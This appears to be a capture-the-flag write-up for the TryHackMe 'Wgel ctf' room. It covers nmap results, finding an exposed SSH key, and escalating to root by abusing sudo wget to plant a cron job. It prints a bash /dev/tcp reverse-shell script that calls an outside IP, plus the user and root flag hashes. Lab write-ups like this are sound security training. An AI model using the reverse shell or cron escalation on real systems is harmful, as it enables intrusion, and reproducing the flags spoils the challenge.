# Tryhackme.com Room : Wgel ctf
`https://tryhackme.com/room/wgelctf`


# Instance
```
export IP=10.10.186.69
```

# Nmap
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:46:B5:34:95:EF (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## Web server
Comments in html
```
<!-- Jessie don't forget to udate the webiste -->
```

Potential user `jessie`

Website at `/sitemap`

Template by `Colorlib` (wordpress)


We finally find ssh key in `/sitemap/.ssh/id_rsa`

The user flag is in `/home/jessie/Documents/user_flag.txt`
```
057c67131c3d5e42dd5cd3075b198ff6
```

We can run `wget` with sudo.

From there, we can go multiple ways, one of the simplest thing to do is create a cron job that open a reverse shell.

We create this cron job definition :
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * *   root    /home/jessie/pwn.sh
```

And the `pwn.sh` script :
```
#!/bin/bash

/bin/bash -i >& /dev/tcp/10.10.143.183/8888 0>&1
```

We then get a root shell and get the flag :

Root flag
```
b1b968b37519ad1daa6408188649263d
```